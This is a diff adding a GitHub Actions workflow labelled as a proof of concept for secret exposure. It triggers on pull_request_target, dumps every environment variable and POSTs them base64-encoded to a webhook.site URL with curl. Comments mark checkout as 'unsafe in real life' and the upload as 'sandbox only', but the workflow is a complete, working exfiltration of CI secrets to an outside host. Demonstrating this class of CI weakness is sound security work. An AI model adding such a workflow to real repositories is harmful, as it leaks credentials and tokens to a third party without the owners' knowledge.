@@ -1,0 +1,22 @@
+# .github/workflows/poc.yml
+name: PoC – Secret Exposure
+
+on:
+  pull_request_target:
+    branches: [ main ]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR code (unsafe in real life)
+        uses: actions/checkout@v3
+
+      - name: Dump environment
+        run: |
+          echo "=== ENVIRONMENT VARS ==="
+          env | sort
+
+      - name: Send to webhook.site (sandbox only)
+        run: |
+          curl -X POST -d "ENV=$(env | base64)" https://webhook.site/3fe8a22a-5982-47f3-9373-e439ba1b9832
